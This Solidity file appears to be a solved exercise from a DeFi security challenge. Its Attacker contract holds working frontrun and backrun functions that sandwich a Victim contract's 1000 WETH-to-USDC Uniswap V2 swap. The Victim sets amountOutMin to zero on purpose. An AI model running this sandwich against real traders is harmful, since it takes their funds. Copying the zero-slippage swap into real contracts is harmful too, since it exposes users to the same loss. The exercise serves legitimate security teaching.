// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./interfaces/IERC20.sol";
import "./interfaces/IUniswapV2Pair.sol";

/**
 *
 *  SANDWICH ATTACK AGAINST A SWAP TRANSACTION
 *
 * We have two contracts: Victim and Attacker. Both contracts have an initial balance of 1000 WETH. The Victim contract
 * will swap 1000 WETH for USDC, setting amountOutMin = 0.
 * The challenge is use the Attacker contract to perform a sandwich attack on the victim's
 * transaction to make profit.
 *
 */
contract Attacker {
    // This function will be called before the victim's transaction.
    IUniswapV2Pair uniPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);

    function frontrun(address router, address weth, address usdc, uint256 deadline) public {
        IUniswapV2Router uniRouter = IUniswapV2Router(router);
        IERC20 wethContract = IERC20(weth);
        (uint256 usdcReserve, uint256 wethReserve,) = uniPair.getReserves();
        uint256 amountIn = 1000 ether;

        uint256 denominator = (wethReserve + amountIn) * 1000;

        uint256 numerator = usdcReserve * amountIn * 997;

        uint256 amountOut = (numerator / denominator) * 99 / 100;
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = usdc;
        uint256 newDeadline = deadline;

        wethContract.approve(router, 1000 ether);
        uniRouter.swapExactTokensForTokens(amountIn, amountOut, path, address(this), newDeadline);

    }

    // This function will be called after the victim's transaction.
    function backrun(address router, address weth, address usdc, uint256 deadline) public {
        IUniswapV2Router uniRouter = IUniswapV2Router(router);
        IERC20 usdcContract = IERC20(usdc);
        (uint256 usdcReserve, uint256 wethReserve,) = uniPair.getReserves();
        uint256 amountIn = usdcContract.balanceOf(address(this));
        uint256 denominator = (usdcReserve + amountIn) * 1000;

        uint256 numerator = wethReserve * amountIn * 997;

        uint256 amountOut = (numerator / denominator);

        address[] memory path = new address[](2);
        path[0] = usdc;
        path[1] = weth;
        uint256 newDeadline = deadline;

        usdcContract.approve(router, usdcContract.balanceOf(address(this)));
        uniRouter.swapExactTokensForTokens(amountIn, amountOut, path, address(this), newDeadline);
    }
}

contract Victim {
    address public immutable router;

    constructor(address _router) {
        router = _router;
    }

    function performSwap(address[] calldata path, uint256 deadline) public {
        IUniswapV2Router(router).swapExactTokensForTokens(1000 * 1e18, 0, path, address(this), deadline);
    }
}

interface IUniswapV2Router {
    /**
     *     amountIn: the amount to use for swap.
     *     amountOutMin: the minimum amount of output tokens that must be received for the transaction not to revert.
     *     path: an array of token addresses. In our case, WETH and USDC.
     *     to: recipient address to receive the liquidity tokens.
     *     deadline: timestamp after which the transaction will revert.
     */
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
}
